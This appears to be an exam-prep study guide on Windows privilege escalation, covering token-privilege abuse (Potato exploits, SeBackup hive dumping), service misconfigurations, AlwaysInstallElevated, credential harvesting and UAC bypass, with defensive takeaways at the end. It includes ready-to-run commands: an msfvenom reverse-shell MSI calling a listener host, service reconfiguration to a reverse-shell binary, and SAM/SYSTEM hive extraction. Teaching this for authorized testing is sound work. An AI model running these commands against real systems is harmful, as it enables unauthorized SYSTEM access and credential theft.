# Domain 3: Windows Privilege Escalation & Token Manipulation — Study Guide

> **Exam weight:** the escalation half (10 points) of every Windows standalone, plus the pivot to `SYSTEM`/Administrator that unlocks credential dumping on the AD set. Windows privesc is privilege-token and service-misconfiguration literacy.

---

## 0. The Windows Escalation Workflow

```text
   [ Low-priv shell (user / service acct) ]
          │
          ▼
   whoami /priv  ─────────► any SeImpersonate/SeBackup/SeDebug/etc.? ──► token path
          │
          ▼
   whoami /groups ; net user ; systeminfo
          │
          ▼
   winPEAS.exe / PowerUp.ps1 / Seatbelt  ── leads, verify manually
          │
          ├── Services: accesschk, unquoted paths, writable binaries, DLL hijack
          ├── Registry: AlwaysInstallElevated, weak service keys, autoruns
          ├── Scheduled tasks: schtasks /query /fo LIST /v
          └── Credentials: cmdkey, unattend.xml, GPP, history, DPAPI, KeePass
          │
          ▼
   [ Match → execute → confirm "nt authority\system" ]
```

`systeminfo` plus the hotfix list feeds Windows-Exploit-Suggester for kernel gaps, but token/service misconfigs are faster and safer than kernel exploits — prefer them.

---

## 1. Access Tokens & Privileges — `whoami /priv`

Every process carries a **token** describing its security context and its *privileges*. Several privileges are escalation-grade. Always start here:

```cmd
whoami /priv
```

### 1.1 `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` — the "Potato" family

Held by most service accounts (IIS `apppool`, MSSQL). It lets a process impersonate a token handed to it. The **Potato** exploits coerce a SYSTEM service to authenticate to a local listener, then impersonate that SYSTEM token:

- **PrintSpoofer** / **GodPotato** — current, reliable on modern Windows 10/11 & Server 2016–2022.
- **JuicyPotatoNG**, **RoguePotato** — variants for specific build/DCOM conditions.

```cmd
GodPotato.exe -cmd "cmd /c whoami"
PrintSpoofer64.exe -i -c cmd
```

The mechanism to articulate: impersonation is a legitimate Windows feature (a service acting on a client's behalf); the exploit abuses it by feeding the service a *SYSTEM* token to impersonate.

### 1.2 `SeBackupPrivilege` / `SeRestorePrivilege` — read/write any file

Grants the right to bypass file ACLs for backup purposes. Abuse it to copy the registry hives holding password hashes:

```cmd
reg save HKLM\SAM  sam.hiv
reg save HKLM\SYSTEM system.hiv
robocopy /b C:\path file.txt .     # /b = backup mode, bypasses ACL
```
Offload `sam.hiv`+`system.hiv` and run `impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL` to extract local hashes → Pass-the-Hash (Domain 4).

### 1.3 Other escalation privileges

- **`SeTakeOwnershipPrivilege`** — take ownership of any object; grant yourself rights over a SYSTEM file/service and replace it.
- **`SeDebugPrivilege`** — debug any process; inject into or dump a SYSTEM process (e.g. `lsass`) for tokens/credentials.
- **`SeManageVolumePrivilege`** — can be chained to obtain broad write access to the volume, enabling a DLL-overwrite path to SYSTEM.

---

## 2. Windows Service Misconfigurations

Services run as SYSTEM; misconfigured ones are the richest non-token vector.

### 2.1 Weak service ACLs (reconfigure the service)

If you can change a service's configuration, point its binary at your payload:

```cmd
accesschk.exe /accepteula -uwcqv user *          # services YOU can modify
sc qc <service>                                  # show current binPath
sc config <service> binPath= "C:\Windows\Temp\rev.exe" obj= LocalSystem
sc stop <service> & sc start <service>           # payload runs as SYSTEM
```

### 2.2 Writable service binary

If the service's `.exe` on disk is writable by you, replace it with your payload and restart the service.

### 2.3 Unquoted service paths

A service whose `binPath` is unquoted and contains spaces (`C:\Program Files\My App\svc.exe`) is launched by trying `C:\Program.exe`, then `C:\Program Files\My.exe`, etc. If you can write to an earlier path, your binary runs as the service account:

```cmd
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
Drop `C:\Program.exe` (if `C:\` is writable) or into any writable intermediate directory, then restart.

### 2.4 DLL hijacking

Windows resolves a missing DLL via a documented search order (application dir first, then system dirs). If a SYSTEM service loads a DLL by name from a writable location — or fails to find one — plant a malicious DLL there. **Procmon** (Sysinternals) with a filter on `NAME NOT FOUND` + `.dll` reveals exactly which DLLs are sought and missed.

### 2.5 Weak service registry keys

If you can write to `HKLM\SYSTEM\CurrentControlSet\Services\<svc>`, modify `ImagePath` to your payload — equivalent to reconfiguring the binPath.

---

## 3. `AlwaysInstallElevated`

If both registry values are `1`, any user can install an MSI as SYSTEM:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f msi -o eye.msi
```
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\eye.msi      # installs as SYSTEM
```

---

## 4. Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```
Look for tasks run as SYSTEM/Administrator that invoke a script or binary you can write to (or an unquoted/relative path). Overwrite the target and wait for the trigger.

---

## 5. Credential Harvesting

Windows leaks credentials in many places; harvested creds enable `runas`, Pass-the-Hash, or lateral movement.

- **`cmdkey /list` + `runas /savecred`** — stored credentials you can reuse without knowing the password:
  ```cmd
  cmdkey /list
  runas /savecred /user:ADMIN "C:\Windows\Temp\rev.exe"
  ```
- **Unattended install files** — `Unattend.xml`, `sysprep.xml`, `autounattend.xml` often contain base64 admin passwords.
- **Group Policy Preferences (`cpassword`)** — `Groups.xml` in SYSVOL with an AES-encrypted password whose *key Microsoft published*; decrypt with `gpp-decrypt`.
- **PowerShell history** — `ConsoleHost_history.txt` (in `AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`) often holds credentials typed on command lines.
- **DPAPI** — browser/credential-manager secrets are DPAPI-protected; with the masterkey (via Mimikatz) you decrypt blobs.
- **App stores** — Sticky Notes (`plum.sqlite`), KeePass (`.kdbx` + possible keyfile), saved RDP/VNC/WinSCP/PuTTY sessions.

---

## 6. UAC Bypass

When you are an *administrator* but running at medium integrity (filtered token), a UAC bypass elevates to high integrity without a prompt. Common auto-elevating-binary hijacks:

- **`fodhelper.exe`** — reads a user-writable registry key to launch a helper; plant your command there.
- **`eventvwr.exe`** — similar registry-based auto-elevation hijack.

These matter when you have admin creds/membership but need a high-integrity shell to dump hashes or run elevated tooling.

---

## 7. Defensive & Reporting Takeaways

- **Privilege assignment** → remove `SeImpersonate`/`SeDebug`/`SeBackup` from accounts that do not need them; monitor service-account privilege use.
- **Services** → correct ACLs (non-admins cannot reconfigure), quote all paths, protect binaries/directories, validate DLL load paths.
- **`AlwaysInstallElevated`** → never enable; it is a direct SYSTEM grant.
- **Credential hygiene** → purge `cpassword` from SYSVOL (patched since MS14-025), remove unattend files post-install, educate against secrets on command lines, protect DPAPI masterkeys.
- **UAC** → set to the highest level; treat UAC as a defence-in-depth boundary, not a security boundary, and minimise local admins.

---

## Key Command Recap

```cmd
whoami /priv & whoami /groups
accesschk.exe /accepteula -uwcqv user *
sc qc <svc> & sc config <svc> binPath= "..."
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
schtasks /query /fo LIST /v
cmdkey /list
reg save HKLM\SAM sam.hiv & reg save HKLM\SYSTEM system.hiv
```

➡️ **Next:** [Exercises.md](./Exercises.md), then [Quiz_1](./Quiz_1.md) (token privileges), [Quiz_2](./Quiz_2.md) (services/unquoted/DLL), [Quiz_3](./Quiz_3.md) (registry/creds/UAC).
